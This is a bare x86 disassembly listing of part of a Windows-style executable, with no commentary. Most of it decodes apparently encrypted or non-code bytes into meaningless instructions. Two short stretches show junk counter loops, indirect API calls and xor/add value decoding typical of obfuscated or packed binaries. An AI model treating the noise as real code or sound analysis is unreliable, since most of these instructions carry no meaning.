  40211a:	sbb    eax,0xcaa47408
  40211f:	(bad)  
  402120:	rcr    al,cl
  402122:	hlt    
  402123:	cld    
  402124:	ror    BYTE PTR [eax+0x41dc2544],0x4
  40212b:	dec    ebp
  40212c:	jbe    0x4020d4
  40212e:	mov    ds:0xdc256439,al
  402134:	sti    
  402135:	imul   eax,DWORD PTR [edi-0x7fa88e83],0xcdde1e28
  40213f:	lea    eax,[ebp+ebp*2-0x24e80779]
  402146:	add    eax,0x2dbe77f7
  40214b:	xchg   edx,eax
  40214c:	dec    ebx
  40214d:	(bad)  
  40214e:	aam    0x37
  402150:	aas    
  402151:	(bad)  
  402152:	stos   BYTE PTR es:[edi],al
  402153:	int3   
  402154:	mov    esi,0xa844f853
  402159:	pop    esp
  40215a:	sti    
  40215b:	ds cs das 
  40215e:	dec    esp
  40215f:	jge    0x40218c
  402161:	mov    ah,0x8c
  402163:	push   0xe1b7e65c
  402168:	daa    
  402169:	popa   
  40216a:	mov    ebp,0x6426ef7c
  40216f:	cmp    BYTE PTR [esi+0x20],cl
  402172:	sbb    ebx,ecx
  402174:	outs   dx,DWORD PTR ds:[esi]
  402175:	ss xor ecx,ebp
  402178:	fiadd  DWORD PTR [ecx]
  40217a:	(bad)  
  40217b:	iret   
  40217c:	push   ss
  40217d:	xor    DWORD PTR [esi-0x54],ebx
  402180:	jne    0x40215e
  402182:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402183:	sub    edi,edx
  402185:	push   esp
  402186:	scas   eax,DWORD PTR es:[edi]
  402187:	mov    cr2,ebp
  40218a:	sub    eax,0xb1320c19
  40218f:	pop    edi
  402190:	out    0x43,al
  402192:	cmc    
  402193:	test   eax,0x21ce3ef9
  402198:	imul   edx,DWORD PTR [edi+edi*2-0x1a],0xffffff9e
  40219d:	mov    edi,0xd7d6625b
  4021a2:	jne    0x402160
  4021a4:	push   edi
  4021a5:	into   
  4021a6:	imul   cl
  4021a8:	seto   BYTE PTR [esi]
  4021ab:	lods   al,BYTE PTR ds:[esi]
  4021ac:	call   FWORD PTR [ebx-0xa]
  4021af:	sbb    ah,BYTE PTR [ebx-0x29dd71a7]
  4021b5:	jmp    0x784d:0xc262090a
  4021bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021bd:	stos   DWORD PTR es:[edi],eax
  4021be:	inc    esp
  4021bf:	stos   DWORD PTR es:[edi],eax
  4021c0:	(bad)  
  4021c1:	retf   0xf561
  4021c4:	ss mov al,0x42
  4021c7:	jno    0x402198
  4021c9:	dec    ecx
  4021ca:	and    ebp,ecx
  4021cc:	push   esi
  4021cd:	loope  0x402153
  4021cf:	out    dx,al
  4021d0:	fidiv  DWORD PTR [di]
  4021d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021d4:	push   edx
  4021d5:	ss icebp 
  4021d7:	ja     0x402233
  4021d9:	and    BYTE PTR [ecx],bl
  4021db:	mov    eax,DWORD PTR [ecx+0x26]
  4021de:	js     0x4021f0
  4021e0:	mov    BYTE PTR [ebx],cl
  4021e2:	jp     0x40223b
  4021e4:	xor    cl,BYTE PTR [esi-0x2a]
  4021e7:	in     eax,0x1
  4021e9:	jle    0x4021c9
  4021eb:	popf   
  4021ec:	add    ecx,DWORD PTR [ebx]
  4021ee:	sbb    BYTE PTR [edi-0x56],ch
  4021f1:	cmp    ah,BYTE PTR [ebp+0x4f]
  4021f4:	mov    ch,0xbe
  4021f6:	pop    ss
  4021f7:	mov    bl,0x4b
  4021f9:	push   ebp
  4021fa:	xchg   ebx,eax
  4021fb:	push   ecx
  4021fc:	nop
  4021fd:	cmp    BYTE PTR [esi],al
  4021ff:	jne    0x4021a7
  402201:	fsub   st,st(0)
  402203:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402204:	jecxz  0x4021a6
  402206:	(bad)  
  402207:	mov    ah,0xdb
  402209:	xchg   ebp,eax
  40220a:	test   al,0x90
  40220c:	cli    
  40220d:	cmp    dh,BYTE PTR [edx]
  40220f:	(bad)  
  402210:	ja     0x402246
  402212:	inc    esi
  402213:	xchg   esp,eax
  402214:	int    0x9a
  402216:	fcomp  DWORD PTR fs:[ebp+0x50da7f96]
  40221d:	inc    esi
  40221e:	mov    ah,0xfd
  402220:	xor    al,0xf3
  402222:	call   0x59a2362c
  402227:	lea    ecx,[ecx+0x36]
  40222a:	xchg   ecx,eax
  40222b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40222c:	arpl   WORD PTR [ecx-0x34468a84],sp
  402232:	push   cs
  402233:	iret   
  402234:	cmp    edx,esi
  402236:	and    al,0x9e
  402238:	fnstenv [ecx+0x78d8c2d5]
  40223e:	sub    edi,DWORD PTR [ecx+0x5a]
  402241:	shr    ecx,1
  402243:	rcr    al,0x5d
  402246:	jg     0x40228a
  402248:	stc    
  402249:	add    ah,BYTE PTR [edi-0x5]
  40224c:	jle    0x40221b
  40224e:	dec    ebx
  40224f:	in     eax,0x32
  402251:	ja     0x402244
  402253:	fwait
  402254:	call   0xb21aefa5
  402259:	sub    ebx,DWORD PTR es:[eax]
  40225c:	mov    bh,0x8a
  40225e:	ffreep st(5)
  402260:	push   ebp
  402261:	push   0x76940870
  402266:	pop    edx
  402267:	dec    esp
  402268:	cs sbb al,0x37
  40226b:	fdivr  QWORD PTR [ebx-0x7d]
  40226e:	push   ss
  40226f:	arpl   WORD PTR [ebp+0x68365c0b],ax
  402275:	inc    ebx
  402276:	gs xor eax,0x6d989d20
  40227c:	mov    bl,0x2c
  40227e:	arpl   WORD PTR [eax-0x37],si
  402281:	xchg   ebx,eax
  402282:	lock inc eax
  402284:	pop    edi
  402285:	mov    al,0x43
  402287:	in     al,0x78
  402289:	pop    ecx
  40228a:	or     BYTE PTR [ebx+0x58],ah
  40228d:	push   edi
  40228e:	in     al,0xf8
  402290:	cmp    al,0x12
  402292:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402293:	xchg   esp,eax
  402294:	ret    0xaf45
  402297:	or     eax,0xb85e35fd
  40229c:	jo     0x4022e7
  40229e:	ret    0xcdb4
  4022a1:	push   esi
  4022a2:	and    BYTE PTR [ebp-0x11],ch
  4022a5:	push   es
  4022a6:	stc    
  4022a7:	adc    al,0xb4
  4022a9:	popa   
  4022aa:	push   esp
  4022ab:	jo     0x402311
  4022ad:	call   0x3de59597
  4022b2:	fnstenv [ecx+eiz*8+0x665c9efe]
  4022b9:	int3   
  4022ba:	and    esi,edx
  4022bc:	mov    bl,0x70
  4022be:	push   ss
  4022bf:	outs   dx,BYTE PTR ds:[esi]
  4022c0:	bound  ebx,QWORD PTR [ecx+0x126c385a]
  4022c6:	bound  esi,QWORD PTR [ebp+0x38]
  4022c9:	add    al,0xfb
  4022cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4022cc:	stc    
  4022cd:	push   ecx
  4022ce:	idiv   DWORD PTR ds:0x51e4679a
  4022d4:	inc    eax
  4022d5:	mov    BYTE PTR [eax],cl
  4022d7:	std    
  4022d8:	cmp    DWORD PTR [ebp+edi*8+0x29],0x9
  4022dd:	lods   eax,DWORD PTR ds:[esi]
  4022de:	stos   BYTE PTR es:[edi],al
  4022df:	aaa    
  4022e0:	not    dh
  4022e2:	or     DWORD PTR [ecx+ecx*1-0x1f],esp
  4022e6:	sub    al,0x2b
  4022e8:	repnz cmp DWORD PTR [edx-0x64],ecx
  4022ec:	lds    eax,FWORD PTR [ecx+ecx*8-0x1286b2f3]
  4022f3:	mov    bh,0x4f
  4022f5:	call   0x32ff2fd7
  4022fa:	cdq    
  4022fb:	clc    
  4022fc:	mov    ah,0x52
  4022fe:	and    ch,dl
  402300:	in     eax,0x59
  402302:	mov    bl,0x7e
  402304:	jae    0x402367
  402306:	sub    ebx,ebp
  402308:	sbb    ebp,DWORD PTR [ebx-0x5d2afb97]
  40230e:	shl    BYTE PTR ds:0x5c72a90e,1
  402314:	fisubr DWORD PTR [ebx]
  402316:	push   esi
  402317:	imul   DWORD PTR [ebx+0x3861aea6]
  40231d:	or     ebx,esi
  40231f:	stos   BYTE PTR es:[edi],al
  402320:	mov    BYTE PTR [edi+0x11],bh
  402323:	jmp    0x4022cf
  402325:	push   esi
  402326:	cs aaa 
  402328:	pop    eax
  402329:	sbb    eax,0x2fa1efcf
  40232e:	pop    ebp
  40232f:	sub    DWORD PTR [edi],esp
  402331:	mov    cl,0xb4
  402333:	add    DWORD PTR [ebp-0x58],edx
  402336:	bound  ebx,QWORD PTR [edx-0x68]
  402339:	scas   eax,DWORD PTR es:[edi]
  40233a:	xchg   BYTE PTR [ecx-0x32],ch
  40233d:	in     al,0x6f
  40233f:	or     ecx,ebp
  402341:	and    ecx,ebp
  402343:	das    
  402344:	stc    
  402345:	mov    cl,0x18
  402347:	mov    bh,0xcc
  402349:	inc    ebp
  40234a:	add    al,0x9a
  40234c:	je     0x402374
  40234e:	stos   BYTE PTR es:[edi],al
  40234f:	or     ecx,0x4be2172e
  402355:	and    dl,al
  402357:	push   ebp
  402358:	xchg   BYTE PTR [ebp-0x977b],cl
  40235e:	inc    DWORD PTR [ebx-0x77]
  402361:	inc    ebp
  402362:	clc    
  402363:	mov    eax,DWORD PTR [ebp-0x10]
  402366:	xor    DWORD PTR ds:0x433717,ecx
  40236c:	mov    DWORD PTR [ebp-0x24],eax
  40236f:	not    ebx
  402371:	mov    eax,DWORD PTR [ebp-0x1c]
  402374:	or     ebx,DWORD PTR ds:0x4337fb
  40237a:	mov    DWORD PTR [ebp-0x20],eax
  40237d:	and    eax,ebx
  40237f:	mov    ebx,0xf89c853d
  402384:	mov    DWORD PTR [ebp-0x50],ebx
  402387:	mov    eax,DWORD PTR [ebp-0x50]
  40238a:	and    DWORD PTR ds:0x43377b,0x0
  402394:	jmp    0x4023a6
  402399:	mov    ecx,DWORD PTR ds:0x43377b
  40239f:	inc    ecx
  4023a0:	mov    DWORD PTR ds:0x43377b,ecx
  4023a6:	cmp    DWORD PTR ds:0x43377b,0x11
  4023ad:	jae    0x4023dd
  4023b3:	cmp    DWORD PTR ds:0x43377b,0x1b
  4023ba:	jne    0x4023cb
  4023c0:	push   0x4337bf
  4023c5:	call   DWORD PTR ds:0x4121bc
  4023cb:	jmp    0x402399
  4023d0:	movzx  ecx,WORD PTR ds:0x4337f7
  4023d7:	or     DWORD PTR ds:0x433767,ecx
  4023dd:	mov    ecx,DWORD PTR [ebp-0x8]
  4023e0:	xor    eax,esi
  4023e2:	add    eax,edi
  4023e4:	or     DWORD PTR ds:0x433777,0x43383f
  4023ee:	mov    DWORD PTR [ecx],eax
  4023f0:	mov    eax,DWORD PTR [ebp-0x24]
  4023f3:	and    DWORD PTR ds:0x43376f,0x0
  4023fd:	mov    ecx,DWORD PTR ds:0x43376f
  402403:	inc    ecx
  402404:	mov    DWORD PTR ds:0x43376f,ecx
  40240a:	cmp    DWORD PTR ds:0x43376f,0x5
  402411:	jne    0x402436
  402417:	push   DWORD PTR [ebp-0x14]
  40241a:	push   DWORD PTR [ebp-0x18]
  40241d:	push   DWORD PTR [ebp-0x24]
  402420:	push   DWORD PTR [ebp-0x20]
  402423:	push   0x40e6
  402428:	push   0x433910
  40242d:	push   DWORD PTR [ebp-0x10]
  402430:	call   DWORD PTR ds:0x412354
  402436:	cmp    DWORD PTR ds:0x43376f,0x4
  40243d:	jne    0x402450
  402443:	mov    ecx,DWORD PTR ds:0x43376f
  402449:	inc    ecx
  40244a:	mov    DWORD PTR ds:0x43376f,ecx
  402450:	cmp    DWORD PTR ds:0x43376f,0x1d
  402457:	jb     0x4023fd
  40245d:	mov    ecx,DWORD PTR [ebp-0x8]
  402460:	xor    eax,esi
  402462:	add    eax,edi
  402464:	mov    DWORD PTR [ecx+0x4],eax
  402467:	mov    eax,DWORD PTR [ebp-0x2c]
  40246a:	mov    ecx,DWORD PTR [ebp-0x8]
  40246d:	jmp    0x40287b
  402472:	ror    BYTE PTR [ecx-0x3a],cl
  402475:	dec    esi
  402476:	inc    ebp
  402477:	push   ecx
  402478:	push   edx
  402479:	push   ecx
  40247a:	sbb    esp,DWORD PTR [edx+0x6798ac70]
  402480:	scas   eax,DWORD PTR es:[edi]
  402481:	add    al,0xba
  402483:	add    DWORD PTR [esi+0x7e],edi
  402486:	outs   dx,DWORD PTR ds:[esi]
  402487:	jge    0x402507
  402489:	jle    0x40240b
  40248b:	retf   0xcc0b
  40248e:	gs push ds
  402490:	xor    edi,DWORD PTR [eax+0x78ea4ad5]
  402496:	cli    
  402497:	ins    BYTE PTR es:[edi],dx
  402498:	push   edi
  402499:	fidivr DWORD PTR [ecx+0xbe34b41]
  40249f:	imul   DWORD PTR [ebx+0x1063e23a]
  4024a5:	lahf   
  4024a6:	out    dx,eax
  4024a7:	gs jb  0x402445
  4024aa:	aam    0xcf
  4024ac:	addr16 pop edx
  4024ae:	mov    edx,esp
  4024b0:	pop    edi
  4024b1:	jmp    0xa3bb:0xfdbd6047
  4024b8:	inc    ecx
  4024b9:	(bad)  [ebx+0x41]
  4024bc:	aad    0x3c
  4024be:	aad    0xfb
  4024c0:	sub    esp,esi
  4024c2:	dec    ebp
  4024c3:	je     0x40250e
  4024c5:	(bad)  
  4024c6:	loope  0x402462
  4024c8:	stos   DWORD PTR es:[edi],eax
  4024c9:	lock cmp bl,al
  4024cc:	pop    ebp
  4024cd:	popa   
  4024ce:	mov    edi,0x111217d8
  4024d3:	jecxz  0x40254f
  4024d5:	mov    ss,WORD PTR [ebx]
  4024d7:	icebp  
  4024d8:	sub    bh,BYTE PTR [ebp-0x471aed8b]
  4024de:	inc    ebx
  4024df:	add    eax,0x43b76957
  4024e4:	arpl   si,bx
  4024e6:	sahf   
  4024e7:	or     DWORD PTR [edi],esp
  4024e9:	inc    esi
  4024ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024eb:	outs   dx,BYTE PTR ds:[esi]
  4024ec:	fimul  WORD PTR ss:[ebx-0x4d]
  4024f0:	mov    DWORD PTR ds:[edx],ebx
  4024f3:	xchg   edx,eax
  4024f4:	mov    esp,0x8c0bef61
  4024f9:	sbb    esp,DWORD PTR [ebx]
  4024fb:	lds    esi,FWORD PTR [esi+0x4]
  4024fe:	int3   
  4024ff:	sub    BYTE PTR [ecx+0x734dd59a],bl
  402505:	and    eax,edi
  402507:	and    eax,0xecf0b415
  40250c:	cwde   
  40250d:	pop    edi
  40250e:	int3   
  40250f:	and    eax,0x9fe59e01
  402514:	push   edx
  402515:	fs xchg ebx,eax
  402517:	ret    
  402518:	mov    edi,0x9bee2afb
  40251d:	les    ebp,FWORD PTR [edx+ebp*4+0x12]
  402521:	cwde   
  402522:	mov    bh,BYTE PTR [eax+0x5ca80b2a]
  402528:	mov    al,ds:0x3f116ca3
  40252d:	fisub  DWORD PTR [eax+0x22fe03f2]
  402533:	addr16 jl 0x4024de
  402536:	jb     0x40250c
  402538:	sti    
  402539:	xor    BYTE PTR [ebx-0xe],bl
  40253c:	push   ds
  40253d:	test   al,0x70
  40253f:	ja     0x402549
  402541:	test   eax,0x1ff3745
  402546:	adc    BYTE PTR [ebx+0x45],ah
  402549:	les    ebp,FWORD PTR [edx-0x4a]
  40254c:	sub    ebx,DWORD PTR [edx+edi*4]
  40254f:	xor    al,0xd7
  402551:	cmp    eax,0x62266f49
  402556:	xor    al,0xef
  402558:	dec    DWORD PTR [eax+eax*4]
  40255b:	xchg   esp,eax
  40255c:	fcmovnb st,st(7)
  40255e:	xchg   DWORD PTR [ebp-0x31],ecx
  402561:	jns    0x4025ca
  402563:	ins    BYTE PTR es:[edi],dx
  402564:	nop
  402565:	dec    ebx
  402567:	loopne 0x4024fb
  402569:	rcr    BYTE PTR [ebp+eiz*8+0x5c9cf6b2],cl
  402570:	test   DWORD PTR ds:0x3d57229c,edx
  402576:	inc    eax
  402577:	adc    esp,edx
  402579:	mov    cs,WORD PTR [ecx-0x4f]
  40257c:	out    0x57,al
  40257e:	fist   WORD PTR [esp+ebp*4+0x22134a44]
  402585:	push   ebx
  402586:	call   0x8c1:0xeedc70e5
  40258d:	pushf  
  40258e:	ret    0xe594
  402591:	mov    cl,cl
  402593:	sbb    bl,dh
  402595:	pop    edx
  402596:	arpl   WORD PTR [esp+edi*8-0x14],si
  40259a:	iret   
  40259b:	mov    cs,WORD PTR [eax+0x390062ba]
  4025a1:	jmp    0x402589
  4025a3:	pop    esp
  4025a4:	adc    cl,BYTE PTR [eax+edi*8-0x324abaa6]
  4025ab:	mov    ds:0xb473eba9,eax
  4025b0:	addr16 push eax
  4025b2:	cmp    BYTE PTR [eax],dh
  4025b4:	stc    
  4025b5:	cdq    
  4025b6:	sti    
  4025b7:	stos   DWORD PTR es:[edi],eax
  4025b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025b9:	pop    ebx
  4025ba:	loop   0x4025fd
  4025bc:	cld    
  4025bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4025be:	enter  0xf758,0x72
  4025c2:	xor    BYTE PTR [ebx-0x26441f41],cl
  4025c8:	dec    ecx
  4025c9:	ds cdq 
  4025cb:	les    ecx,FWORD PTR [edx+0x0]
  4025ce:	es inc eax
  4025d0:	hlt    
  4025d1:	sahf   
  4025d2:	jno    0x402568
  4025d4:	mov    esi,0xfb4e17f
  4025d9:	or     al,0x17
  4025db:	mov    ds:0xdb25d344,al
  4025e0:	mov    dl,0xc2
  4025e2:	inc    edi
  4025e3:	sbb    BYTE PTR [ecx+0x35],al
  4025e6:	enter  0xda8a,0x4e
  4025ea:	dec    eax
  4025eb:	dec    esp
  4025ec:	dec    esp
  4025ed:	mov    ecx,0x3dad3e28
  4025f2:	pop    eax
  4025f3:	fnclex 
  4025f5:	sub    al,0x8f
  4025f7:	jl     0x4025aa
  4025f9:	pop    ebp
  4025fa:	pop    ecx
  4025fb:	addr16 dec ebx
  4025fd:	push   eax
  4025fe:	in     eax,0x8c
  402600:	in     eax,0x79
  402602:	enter  0x7eb9,0xf0
  402606:	pop    ecx
  402607:	out    0xa2,eax
  402609:	sbb    BYTE PTR [ebx-0x18e6f648],al
  40260f:	inc    edx
  402610:	test   al,0x4d
  402612:	jl     0x4025b5
  402614:	inc    ebp
  402615:	(bad)  
  402616:	nop
  402617:	scas   eax,DWORD PTR es:[edi]
  402618:	jno    0x402634
  40261a:	add    bh,bh
  40261c:	sub    dl,BYTE PTR [eax+0xb]
  40261f:	jmp    0x340a:0xddecbdf2
  402626:	jmp    0xadaef2a8
  40262b:	add    DWORD PTR [edx-0x30112b67],edi
  402631:	cmp    ebx,0x5d
  402634:	jp     0x40268b
  402636:	les    ecx,FWORD PTR [eax+ecx*1]
  402639:	les    ecx,FWORD PTR [ebp+0x5c4bd7fa]
  40263f:	sar    DWORD PTR [esi+ebp*8-0x477d15ab],cl
  402646:	and    DWORD PTR [edi],ebx
  402648:	push   cs
  402649:	and    eax,0x89bf165f
  40264e:	dec    ecx
  40264f:	dec    esi
  402650:	xlat   BYTE PTR ds:[ebx]
  402651:	test   BYTE PTR [edx],bl
  402653:	cmp    al,0x6a
  402655:	and    eax,0x9829432e
  40265a:	aaa    
  40265b:	cwde   
  40265c:	dec    eax
  40265d:	xor    eax,0x36267fa2
  402662:	lods   al,BYTE PTR ds:[esi]
  402663:	xchg   ebx,eax
  402664:	(bad)  
  402665:	adc    eax,0xa6328ea7
  40266a:	xchg   edx,eax
  40266b:	int    0xaa
  40266d:	dec    ebx
  40266e:	leave  
  40266f:	stc    
  402670:	jmp    0x330c09a9
  402675:	imul   esp,DWORD PTR [ebx],0xffffffd3
  402678:	xchg   ebx,eax
  402679:	xor    BYTE PTR [eax-0x24],bh
  40267c:	mov    bh,0xdf
  40267e:	dec    ecx
  40267f:	out    dx,al
  402680:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402681:	sub    BYTE PTR [ecx],ch
  402683:	fild   WORD PTR [ebx]
  402685:	inc    esi
  402686:	pop    ebp
  402687:	add    DWORD PTR [ecx+0x1c94f021],ebx
  40268d:	sbb    al,0xf2
  40268f:	add    esp,DWORD PTR [ecx]
  402691:	stos   DWORD PTR es:[edi],eax
  402692:	sbb    eax,DWORD PTR [esi+0x6b257147]
  402698:	push   edi
  402699:	adc    eax,0xf352efd
  40269e:	mov    bl,0x7a
  4026a0:	and    al,BYTE PTR [eax]
  4026a2:	fcomp  DWORD PTR [esi]
  4026a4:	and    DWORD PTR [eax+0x2],edi
  4026a7:	and    BYTE PTR [edx],cl
  4026a9:	fwait
  4026aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4026ab:	xchg   esp,eax
  4026ac:	sub    dh,BYTE PTR [edi]
  4026ae:	daa    
  4026af:	lahf   
  4026b0:	fisttp QWORD PTR [esi+0x55ccf4c9]
  4026b6:	xchg   ebx,eax
  4026b7:	and    ebx,DWORD PTR [eax+0x3ad00549]
  4026bd:	retf   
  4026be:	lods   al,BYTE PTR ds:[esi]
  4026bf:	repnz push cs
  4026c1:	dec    edx
  4026c2:	retf   
  4026c3:	test   eax,edi
  4026c5:	and    BYTE PTR [ebp-0x3e],ch
  4026c8:	sbb    ah,BYTE PTR [eax-0x49]
  4026cb:	and    BYTE PTR [esi-0x13],bh
  4026ce:	push   ebx
  4026cf:	sbb    BYTE PTR ds:0x602f52a0,0x30
  4026d6:	adc    DWORD PTR [esi+eax*8],ebx
  4026d9:	mov    bh,0x1a
  4026db:	in     eax,dx
  4026dc:	and    BYTE PTR [ecx],al
  4026de:	sub    dl,BYTE PTR [edi+0x5822059]
  4026e4:	or     edi,edi
  4026e6:	push   ss
  4026e7:	and    esi,DWORD PTR [eax]
  4026e9:	and    eax,DWORD PTR [esi+0x66]
  4026ec:	rol    BYTE PTR [edx],1
  4026ee:	imul   ebx,DWORD PTR [ebp+0x4c5449e6],0x26
  4026f5:	pop    ecx
  4026f6:	add    BYTE PTR [ecx+0x28],ah
  4026f9:	ins    BYTE PTR es:[edi],dx
  4026fa:	clc    
  4026fb:	adc    al,0x3e
  4026fd:	push   ebp
  4026fe:	nop
  4026ff:	mov    ecx,0x1572089
  402704:	mov    ch,0xf8
  402706:	and    eax,0xe0ea3985
  40270b:	mov    edx,0xc00ee70e
  402710:	lahf   
  402711:	or     eax,0x8837f26c
  402716:	aaa    
  402717:	push   edi
  402718:	(bad)  
  402719:	pop    es
  40271a:	sbb    al,0x39
  40271c:	out    dx,al
  40271d:	ficomp WORD PTR [ecx]
  40271f:	push   0x22fe5a5f
  402724:	imul   ebp,ecx,0xe221e9b4
  40272a:	jmp    0x59b7af22
  40272f:	jb     0x402792
  402731:	and    DWORD PTR [edi],edi
  402733:	jae    0x402748
  402735:	mov    ch,0x40
  402737:	sbb    eax,0x12424df7
  40273c:	and    BYTE PTR [ebp+esi*1+0x39],bh
  402740:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402741:	mov    al,es:0xfa35aa13
  402747:	les    edx,FWORD PTR [esi+0x58]
  40274a:	xor    DWORD PTR [esi-0x58fd6d0a],edx
  402750:	popa   
  402751:	popa   
  402752:	adc    al,0x5d
  402754:	in     eax,dx
  402755:	(bad)  
  402756:	jo     0x40277b
  402758:	lea    ebx,[edx+0x1c]
  40275b:	sub    al,BYTE PTR [esi-0x50cf47c7]
  402761:	xor    DWORD PTR [ebx],ebp
  402763:	xor    eax,0x5c3f6354
  402768:	popa   
  402769:	stos   BYTE PTR es:[edi],al
  40276a:	(bad)  
  40276b:	push   ebp
  40276c:	retf   
  40276d:	adc    DWORD PTR [edx],ecx
  40276f:	loopne 0x4027c5
  402771:	sbb    BYTE PTR [ecx-0x7ca1d718],ch
  402777:	sub    al,0x18
  402779:	mov    bh,bh
  40277b:	pop    ecx
  40277c:	push   esp
  40277d:	fcmovne st,st(5)
  40277f:	dec    ecx
  402780:	fbld   TBYTE PTR [ebp-0x2fb82735]
  402786:	sub    BYTE PTR [edi+0x20b84ba7],al
  40278c:	addr16 aad 0x5
  40278f:	jns    0x4027e4
  402791:	je     0x402788
  402793:	imul   eax,DWORD PTR [ecx-0x4d1caa53],0xffffff83
  40279a:	mov    bl,0x6d
  40279c:	(bad)  
  40279d:	jg     0x402785
  40279f:	adc    ebp,DWORD PTR [edx-0x34]
  4027a2:	lock dec esi
  4027a4:	gs addr16 (bad) 
  4027a8:	jb     0x4027cf
  4027aa:	jmp    DWORD PTR [edi-0x6]
  4027ad:	ins    BYTE PTR es:[edi],dx
  4027ae:	pop    ecx
  4027af:	outs   dx,BYTE PTR ds:[esi]
  4027b0:	out    0x46,eax
  4027b2:	inc    ebp
  4027b3:	mov    edx,0x8ab24ea8
  4027b8:	imul   eax,DWORD PTR [ebx-0x2dadfb32],0xe412b50e
  4027c2:	(bad)  
  4027c4:	push   eax
  4027c5:	inc    eax
  4027c6:	mov    ds:0xd6b93677,eax
  4027cb:	or     DWORD PTR ds:[eax-0x507429d5],0x7d
  4027d3:	mov    ds:0xa8d6ed7e,al
  4027d8:	inc    edx
  4027d9:	nop
  4027da:	je     0x402773
  4027dc:	enter  0xae41,0x1e
  4027e0:	lea    eax,[edx+0x4]
  4027e3:	mov    ds:0x2ac050b2,al
  4027e8:	aam    0xd3
  4027ea:	adc    cl,BYTE PTR [ebx-0x1a47536]
  4027f0:	xor    edx,DWORD PTR [ebp+0x42]
  4027f3:	cli    
  4027f4:	es mov ebx,0x317ff293
  4027fa:	stos   BYTE PTR es:[edi],al
  4027fb:	cli    
  4027fc:	mov    ss,WORD PTR [edx+0x24]
  4027ff:	pop    ecx
  402800:	jne    0x4027ea
  402802:	pushf  
  402803:	sub    esp,esp
  402805:	setle  BYTE PTR [ebx+0x6271954]
  40280c:	xchg   BYTE PTR [ecx+0x3d],ch
  40280f:	ret    0x7dd0
  402812:	and    ecx,ebp
  402814:	jg     0x402890
  402816:	js     0x4027ac
  402818:	push   ebx
  402819:	sub    bh,BYTE PTR [ecx-0x8]
  40281c:	dec    esi
  40281d:	aaa    
  40281e:	das    
  40281f:	and    al,0xfa
  402821:	and    ah,BYTE PTR [esp+ebx*4+0x55583f38]
  402828:	push   es
  402829:	jl     0x402833
  40282b:	lds    esi,FWORD PTR [esi-0x5b62bd5e]
  402831:	or     esp,esi
  402833:	mov    ecx,0x5cf18c2a
  402838:	mov    ebp,0x1490db07
  40283d:	bound  ecx,QWORD PTR [ebp-0xb]
  402840:	add    al,0x52
  402842:	and    esi,edx
  402844:	sti    
  402845:	jo     0x40283f
  402847:	fiadd  WORD PTR [esi+0x6d0c0f96]
  40284d:	mov    bh,0x63
  40284f:	pushf  
  402850:	jmp    0x5e75:0x58ce2285
  402857:	cmc    
  402858:	sbb    eax,0x5e241e5d
  40285d:	mov    esp,0x26d911d7
  402862:	xor    eax,0xf2929138
  402867:	call   0xf5936fad
  40286c:	cmp    cl,BYTE PTR [ebp-0x5b5f7cf9]
  402872:	sbb    eax,0xd136f1e6
  402877:	sub    BYTE PTR ds:0x4189bc86,dl
  40287d:	or     BYTE PTR [ebx+0x4d8bd045],cl
  402883:	clc    
  402884:	mov    DWORD PTR [ecx+0xc],eax
  402887:	mov    eax,DWORD PTR [ebp-0x34]
  40288a:	mov    ecx,DWORD PTR [ebp-0x8]
  40288d:	mov    DWORD PTR [ecx+0x10],eax
  402890:	mov    eax,eax
  402892:	mov    eax,DWORD PTR [ebp-0x20]
  402895:	xor    eax,esi
  402897:	add    eax,edi
  402899:	je     0x402cd8
  40289f:	lea    eax,[ebp-0x98]
  4028a5:	push   eax
  4028a6:	mov    eax,DWORD PTR [ebp-0x1c]
  4028a9:	xor    eax,esi
  4028ab:	add    eax,edi
  4028ad:	push   eax
  4028ae:	mov    eax,DWORD PTR [ebp-0x18]
  4028b1:	jmp    0x402cbf
  4028b6:	xor    eax,DWORD PTR [ebx]
  4028b8:	mov    dl,0xa
  4028ba:	mov    dl,0xab
  4028bc:	mov    bl,0x23
  4028be:	sbb    al,0x86
  4028c0:	adc    al,BYTE PTR [ebx-0x2ece8aa0]
  4028c6:	stos   DWORD PTR es:[edi],eax
  4028c7:	or     eax,0x7d6f7e7e
  4028cc:	jle    0x40294c
  4028ce:	push   edx
  4028cf:	test   eax,0x54a9bbf4
  4028d4:	jp     0x4028cc
  4028d6:	fdivr  DWORD PTR [edi]
  4028d8:	mov    WORD PTR [ebp-0x25],?
  4028db:	int3   
  4028dc:	ror    dh,0x3d
  4028df:	jae    0x402942
  4028e1:	je     0x40286e
  4028e3:	cmc    
  4028e4:	imul   ebx,esp,0x47
  4028e7:	ins    DWORD PTR es:[edi],dx
  4028e8:	jns    0x402880
  4028ea:	cmp    al,0xa
  4028ec:	out    dx,al
  4028ed:	xor    ecx,DWORD PTR [ebx-0x76]
  4028f0:	jecxz  0x40288c
  4028f2:	fs inc ebx
  4028f4:	sti    
  4028f5:	retf   0xccf0
  4028f8:	xlat   BYTE PTR ds:[ebx]
  4028f9:	or     ebp,esi
  4028fb:	jne    0x4028a1
  4028fd:	retf   
  4028fe:	fnstcw WORD PTR [ecx]
  402900:	jno    0x402910
  402902:	xor    al,0x31
  402904:	sahf   
  402905:	cmp    esi,DWORD PTR [edi-0xf]
  402908:	dec    edi
  402909:	aas    
  40290a:	dec    esi
  40290b:	pop    esp
  40290c:	xchg   edi,eax
  40290d:	mov    ds:0x89b85615,al
  402912:	clc    
  402913:	mov    esp,0x7ee11daf
  402918:	inc    ebx
  402919:	retf   0x6d2b
  40291c:	fcomp  st(4)
  40291e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40291f:	jecxz  0x402981
  402921:	test   eax,0x4b741cc7
  402926:	or     dl,0xec
  402929:	arpl   dx,sp
  40292b:	mov    ecx,0x7e97110e
  402930:	jl     0x402954
